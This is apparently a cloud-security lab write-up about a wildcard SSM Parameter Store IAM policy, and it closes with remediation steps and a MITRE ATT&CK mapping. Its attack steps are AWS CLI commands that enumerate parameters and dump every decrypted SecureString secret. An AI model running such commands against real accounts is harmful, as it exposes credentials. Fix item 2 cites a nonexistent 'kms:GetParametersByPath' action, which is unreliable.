# SSM Parameter Store Path Wildcard

**Provider:** AWS | **Category:** IAM / Secrets Management

## Scenario

A deployment agent IAM user was given `ssm:GetParametersByPath` with
`Resource: "arn:aws:ssm:*:*:parameter/cumulonimbus/*"` — a path-level wildcard.
The intent was to allow the agent to read only its own application config under
`/cumulonimbus/production/app/`, but the wildcard grants access to **every** parameter
under the `/cumulonimbus/` hierarchy, including SecureString credentials and the flag.
Combined with `kms:Decrypt` on `*`, all SecureString values can be decrypted inline.

## Attack Path

```
[Attacker] deploy-agent-<id>
    |
    v
aws ssm describe-parameters  -->  enumerate all parameter names
    |
    v
aws ssm get-parameters-by-path --path /cumulonimbus/ --recursive --with-decryption
    |
    v
/cumulonimbus/production/flag  -->  flag (SecureString, decrypted inline)
```

### Step 1 — Configure the attacker profile

```bash
aws configure --profile attacker   # region: eu-west-1
```

### Step 2 — Enumerate parameter names

```bash
aws ssm describe-parameters --profile attacker \
  --query "Parameters[].Name" --output text | tr '\t' '\n'
```

### Step 3 — Dump all parameters with decryption

```bash
aws ssm get-parameters-by-path \
  --path /cumulonimbus/ \
  --recursive \
  --with-decryption \
  --profile attacker \
  --query "Parameters[].{Name:Name,Value:Value}"
```

## How to Fix in Production

1. **Scope `ssm:GetParametersByPath` to the exact path** the service needs — e.g. `/cumulonimbus/production/app/` not `/cumulonimbus/`.
2. **Scope `kms:GetParametersByPath` resource to the specific KMS key** used for that service's parameters.
3. **Use separate KMS keys per application tier** so that a compromised deployment key cannot decrypt secrets belonging to other services.
4. **Enable AWS CloudTrail** and alert on `GetParametersByPath` calls that traverse more than the expected path depth.
5. **Use IAM Conditions** (`ssm:Hierarchies` condition key) to further restrict which hierarchies a principal can traverse.

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Unsecured Credentials: Credentials in Files | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) |
| Cloud Infrastructure Discovery | [T1580](https://attack.mitre.org/techniques/T1580/) |
| Valid Accounts: Cloud Accounts | [T1078.004](https://attack.mitre.org/techniques/T1078/004/) |
